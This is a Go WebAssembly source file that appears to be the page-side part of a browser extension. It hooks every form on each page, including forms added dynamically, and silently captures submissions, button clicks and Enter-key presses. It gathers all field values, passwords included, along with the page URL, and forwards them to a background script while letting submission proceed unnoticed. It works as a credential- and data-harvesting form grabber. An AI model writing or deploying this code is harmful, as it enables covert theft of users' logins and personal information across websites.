//go:build js && wasm
// +build js,wasm

package main

import (
	"fmt"
	"strings"
	"syscall/js"
)

type FormProcessor struct {
	processedForms map[string]bool
}

func NewFormProcessor() *FormProcessor {
	return &FormProcessor{
		processedForms: make(map[string]bool),
	}
}

// getFormData extracts form data as a readable string
func (fp *FormProcessor) getFormData(form js.Value) string {
	var data []string

	inputs := form.Call("querySelectorAll", "input, select, textarea")
	inputsLength := inputs.Get("length").Int()

	for i := 0; i < inputsLength; i++ {
		input := inputs.Index(i)
		inputType := input.Get("type").String()
		name := input.Get("name").String()
		value := input.Get("value").String()

		if name == "" {
			name = "unnamed"
		}

		// Skip submit buttons and buttons as their text/value can change during submission
		if inputType == "submit" || inputType == "button" {
			continue
		}

		switch inputType {
		case "checkbox", "radio":
			if input.Get("checked").Bool() {
				if value == "" {
					value = "checked"
				}
				data = append(data, fmt.Sprintf("%s: %s", name, value))
			}
		case "file":
			files := input.Get("files")
			if !files.IsNull() && files.Get("length").Int() > 0 {
				fileName := files.Index(0).Get("name").String()
				data = append(data, fmt.Sprintf("%s: [File: %s]", name, fileName))
			}
		default:
			if value != "" {
				data = append(data, fmt.Sprintf("%s: %s", name, value))
			}
		}
	}

	if len(data) == 0 {
		return "No form data found"
	}

	return strings.Join(data, "\n")
}

func (fp *FormProcessor) interceptFormSubmission(form js.Value) {
	form.Set("_isIntercepting", true)

	submitHandler := js.FuncOf(func(this js.Value, args []js.Value) interface{} {
		js.Global().Get("handleFormSubmission").Invoke(form, args[0])
		return nil
	})

	form.Set("_submitHandler", submitHandler)
	form.Call("addEventListener", "submit", submitHandler)
	fp.addInputChangeListeners(form)
	fp.addKeyboardListeners(form)
}

func (fp *FormProcessor) addButtonClickListeners(form js.Value) {
	buttons := form.Call("querySelectorAll", "button, input[type='submit'], input[type='button']")
	buttonsLength := buttons.Get("length").Int()

	for i := 0; i < buttonsLength; i++ {
		button := buttons.Index(i)
		fp.addClickListenerToElement(form, button)
	}
}

func (fp *FormProcessor) addClickListenerToElement(form js.Value, element js.Value) {
	buttonClickHandler := js.FuncOf(func(this js.Value, args []js.Value) interface{} {
		js.Global().Get("handleButtonClick").Invoke(form, element, args[0])
		return nil
	})

	element.Set("_formClickHandler", buttonClickHandler)
	element.Call("addEventListener", "click", buttonClickHandler)
}

func (fp *FormProcessor) isFormField(element js.Value) bool {
	tagName := strings.ToLower(element.Get("tagName").String())

	formFieldTags := []string{"input", "textarea", "select", "option"}
	for _, tag := range formFieldTags {
		if tagName == tag {
			return true
		}
	}

	if element.Get("contentEditable").String() == "true" {
		return true
	}

	role := strings.ToLower(element.Get("role").String())
	inputRoles := []string{"textbox", "combobox", "listbox", "checkbox", "radio", "slider", "spinbutton"}
	for _, inputRole := range inputRoles {
		if role == inputRole {
			return true
		}
	}

	return false
}

func (fp *FormProcessor) isLikelySubmitTrigger(element js.Value) bool {
	if fp.isFormField(element) {
		return false
	}

	tagName := strings.ToLower(element.Get("tagName").String())
	textContent := strings.ToLower(element.Get("textContent").String())

	if tagName == "button" {
		if strings.Contains(textContent, "forgot") || strings.Contains(textContent, "help") ||
			strings.Contains(textContent, "cancel") || strings.Contains(textContent, "back") {
			return false
		}
		return true
	}

	return false
}

func (fp *FormProcessor) addInputChangeListeners(form js.Value) {
	inputs := form.Call("querySelectorAll", "input, select, textarea")
	inputsLength := inputs.Get("length").Int()

	for i := 0; i < inputsLength; i++ {
		input := inputs.Index(i)

		changeHandler := js.FuncOf(func(this js.Value, _ []js.Value) interface{} {
			form.Set("_lastChangeTime", js.Global().Get("Date").New().Call("getTime"))
			return nil
		})

		input.Set("_formChangeHandler", changeHandler)
		input.Call("addEventListener", "input", changeHandler)
		input.Call("addEventListener", "change", changeHandler)
	}
}

func (fp *FormProcessor) addKeyboardListeners(form js.Value) {
	keydownHandler := js.FuncOf(func(this js.Value, args []js.Value) interface{} {
		if len(args) > 0 {
			event := args[0]
			if event.Get("key").String() == "Enter" || event.Get("keyCode").Int() == 13 {
				target := event.Get("target")
				if target.Get("tagName").String() == "INPUT" {
					js.Global().Get("handleEnterKeySubmission").Invoke(form, event)
				}
			}
		}
		return nil
	})

	form.Set("_formKeydownHandler", keydownHandler)
	form.Call("addEventListener", "keydown", keydownHandler)
}

func handleButtonClick(this js.Value, args []js.Value) interface{} {
	form := args[0]
	element := args[1]
	_ = args[2] // event parameter not used

	if !form.Get("_isIntercepting").Bool() {
		return nil
	}

	elementText := element.Get("textContent").String()
	isSubmitTrigger := processor.isLikelySubmitTrigger(element)

	if isSubmitTrigger {
		if submissionTracker != nil {
			submissionTracker.captureFormSubmission(form, "Button Click Submission", elementText)
		}
	}

	return nil
}

func handleEnterKeySubmission(this js.Value, args []js.Value) interface{} {
	form := args[0]
	_ = args[1] // event parameter not used

	if !form.Get("_isIntercepting").Bool() {
		return nil
	}

	msgHandler.sendDebugInfo("Enter key submission detected (passive mode)")

	if submissionTracker != nil {
		submissionTracker.captureFormSubmission(form, "Enter Key Submission", "")
	}

	return nil
}

func (fp *FormProcessor) setupEnhancedMutationObserver() {
	callback := js.FuncOf(func(this js.Value, args []js.Value) interface{} {
		js.Global().Get("handleEnhancedMutations").Invoke(args[0])
		return nil
	})

	observer = js.Global().Get("MutationObserver").New(callback)

	config := map[string]interface{}{
		"childList":             true,
		"subtree":               true,
		"attributes":            true,
		"attributeOldValue":     true,
		"characterData":         true,
		"characterDataOldValue": true,
	}
	observer.Call("observe", document.Get("body"), config)
}

func handleEnhancedMutations(this js.Value, args []js.Value) interface{} {
	mutations := args[0]
	mutationsLength := mutations.Get("length").Int()

	for i := 0; i < mutationsLength; i++ {
		mutation := mutations.Index(i)
		mutationType := mutation.Get("type").String()

		switch mutationType {
		case "childList":
			addedNodes := mutation.Get("addedNodes")
			addedNodesLength := addedNodes.Get("length").Int()

			for j := 0; j < addedNodesLength; j++ {
				node := addedNodes.Index(j)
				nodeType := node.Get("nodeType").Int()

				if nodeType == 1 { // Node.ELEMENT_NODE
					tagName := node.Get("tagName").String()

					if tagName == "FORM" && !node.Call("hasAttribute", "data-form-processed").Bool() {
						processor.processForm(node)
					}

					childForms := node.Call("querySelectorAll", "form:not([data-form-processed])")
					childFormsLength := childForms.Get("length").Int()

					for k := 0; k < childFormsLength; k++ {
						childForm := childForms.Index(k)
						processor.processForm(childForm)
					}
				}
			}
		case "attributes":
			target := mutation.Get("target")
			attributeName := mutation.Get("attributeName").String()

			if target.Get("tagName").String() == "FORM" {
				if attributeName == "action" || attributeName == "method" {
					msgHandler.sendDebugInfo(fmt.Sprintf("Form attribute changed: %s", attributeName))
				}
			}
		}
	}

	return nil
}

func (fp *FormProcessor) setupMutationObserver() {
	fp.setupEnhancedMutationObserver()
}

func handleFormSubmission(this js.Value, args []js.Value) interface{} {
	form := args[0]
	_ = args[1] // event - not used in passive mode

	if !form.Get("_isIntercepting").Bool() {
		return nil
	}

	formId := form.Get("_uniqueFormId")
	var formIdStr string
	if !formId.IsUndefined() {
		formIdStr = formId.String()
	} else {
		formIdStr = form.Get("id").String()
		if formIdStr == "" {
			formIdStr = "unknown"
		}
	}

	msgHandler.sendDebugInfo(fmt.Sprintf("Form %s submission handler: Capturing data only (passive mode)", formIdStr))

	if submissionTracker != nil {
		submissionTracker.captureFormSubmission(form, "Form Submission", "")
	}

	msgHandler.sendDebugInfo(fmt.Sprintf("Form %s submission handler: Allowing normal submission to proceed", formIdStr))
	return nil
}

func (fp *FormProcessor) processForm(form js.Value) {
	formId := form.Get("id").String()
	if formId == "" {
		// Use a combination of action, method, and input count for uniqueness
		action := form.Get("action").String()
		method := form.Get("method").String()
		inputs := form.Call("querySelectorAll", "input, select, textarea")
		inputCount := inputs.Get("length").Int()

		formId = fmt.Sprintf("form_%s_%s_%d_%d", action, method, inputCount, len(fp.processedForms))
	}

	if fp.processedForms[formId] {
		return
	}

	form.Set("_uniqueFormId", formId)
	fp.interceptFormSubmission(form)
	form.Call("setAttribute", "data-form-processed", "true")
	fp.processedForms[formId] = true
}

func (fp *FormProcessor) interceptForms() {
	forms := document.Call("querySelectorAll", "form:not([data-form-processed])")
	formsLength := forms.Get("length").Int()

	for i := 0; i < formsLength; i++ {
		form := forms.Index(i)
		fp.processForm(form)
	}

	fmt.Printf("Form Interceptor: Found and processed %d form(s)\n", formsLength)
}

func initializeFormInterceptor() {
	readyState := document.Get("readyState").String()

	if readyState == "loading" {
		domLoadedCallback := js.FuncOf(func(this js.Value, args []js.Value) interface{} {
			js.Global().Get("startFormInterceptor").Invoke()
			return nil
		})
		document.Call("addEventListener", "DOMContentLoaded", domLoadedCallback)
	} else {
		processor.interceptForms()
		processor.setupMutationObserver()
	}
}

func startFormInterceptor(this js.Value, args []js.Value) interface{} {
	processor.interceptForms()
	processor.setupMutationObserver()
	return nil
}

func interceptAllForms(this js.Value, args []js.Value) interface{} {
	processor.interceptForms()
	return nil
}

// SubmissionTracker prevents duplicate form submissions from being captured
type SubmissionTracker struct {
	recentSubmissions map[string]int64 // form hash -> timestamp
	submissionWindow  int64            // milliseconds to consider duplicates
}

func NewSubmissionTracker() *SubmissionTracker {
	return &SubmissionTracker{
		recentSubmissions: make(map[string]int64),
		submissionWindow:  100, // Reduced to 100ms for passive mode
	}
}

func (st *SubmissionTracker) generateSubmissionHash(form js.Value, submissionType string) string {
	uniqueFormId := form.Get("_uniqueFormId")
	var formId string
	if !uniqueFormId.IsUndefined() {
		formId = uniqueFormId.String()
	} else {
		formId = form.Get("id").String()
		if formId == "" {
			formIndex := 0
			allForms := document.Call("querySelectorAll", "form")
			allFormsLength := allForms.Get("length").Int()
			for i := 0; i < allFormsLength; i++ {
				if allForms.Index(i).Equal(form) {
					formIndex = i
					break
				}
			}
			formId = fmt.Sprintf("unprocessed_form_%d", formIndex)
		}
	}

	currentUrl := window.Get("location").Get("href").String()
	formAction := form.Get("action").String()

	// Get stable form signature: input names and types (not values which can change)
	inputs := form.Call("querySelectorAll", "input, select, textarea")
	inputsLength := inputs.Get("length").Int()

	var inputSignature []string
	for i := 0; i < inputsLength; i++ {
		input := inputs.Index(i)
		inputName := input.Get("name").String()
		inputType := input.Get("type").String()
		if inputName != "" {
			inputSignature = append(inputSignature, fmt.Sprintf("%s:%s", inputName, inputType))
		}
	}

	// Create hash from stable form characteristics (not dynamic values)
	stableData := fmt.Sprintf("%s|%s|%s|%s", formId, currentUrl, formAction, strings.Join(inputSignature, ","))

	hashValue := 0
	for _, char := range stableData {
		hashValue = hashValue*31 + int(char)
	}

	return fmt.Sprintf("%d", hashValue)
}

func (st *SubmissionTracker) shouldCaptureSubmission(form js.Value, submissionType string) bool {
	now := int64(js.Global().Get("Date").New().Call("getTime").Int())

	st.cleanOldSubmissions(now)
	submissionHash := st.generateSubmissionHash(form, submissionType)

	formId := form.Get("_uniqueFormId")
	var formIdStr string
	if !formId.IsUndefined() {
		formIdStr = formId.String()
	} else {
		formIdStr = form.Get("id").String()
		if formIdStr == "" {
			formIdStr = "unknown"
		}
	}

	msgHandler.sendDebugInfo(fmt.Sprintf("Form %s - Checking submission hash: %s for type: %s", formIdStr, submissionHash, submissionType))

	if lastTime, exists := st.recentSubmissions[submissionHash]; exists {
		if now-lastTime < st.submissionWindow {
			msgHandler.sendDebugInfo(fmt.Sprintf("Duplicate found - last seen %dms ago", now-lastTime))
			return false
		}
	}

	st.recentSubmissions[submissionHash] = now
	msgHandler.sendDebugInfo(fmt.Sprintf("New submission recorded for hash: %s", submissionHash))
	return true
}

func (st *SubmissionTracker) cleanOldSubmissions(now int64) {
	for hash, timestamp := range st.recentSubmissions {
		if now-timestamp > st.submissionWindow*2 { // Clean entries older than 2x window
			delete(st.recentSubmissions, hash)
		}
	}
}

func (st *SubmissionTracker) captureFormSubmission(form js.Value, submissionType string, buttonText string) {
	if !st.shouldCaptureSubmission(form, submissionType) {
		msgHandler.sendDebugInfo(fmt.Sprintf("Duplicate submission detected for %s, skipping...", submissionType))
		return
	}

	msgHandler.sendDebugInfo(fmt.Sprintf("Capturing unique submission: %s", submissionType))

	formData := processor.getFormData(form)
	currentUrl := window.Get("location").Get("href").String()
	formAction := form.Get("action").String()
	if formAction == "" {
		formAction = "Not specified"
	}

	var submissionMessage string
	if buttonText != "" {
		submissionMessage = fmt.Sprintf(`%s - Button: %s
URL: %s
Form Action: %s
Form Data:
%s`, submissionType, buttonText, currentUrl, formAction, formData)
	} else {
		submissionMessage = fmt.Sprintf(`%s
URL: %s
Form Action: %s
Form Data:
%s`, submissionType, currentUrl, formAction, formData)
	}

	if msgHandler != nil {
		msgHandler.sendDebugInfo("Sending form data to background script")
		msgHandler.sendFormData(submissionMessage)
	} else {
		println("msgHandler is nil, cannot send data")
	}
}
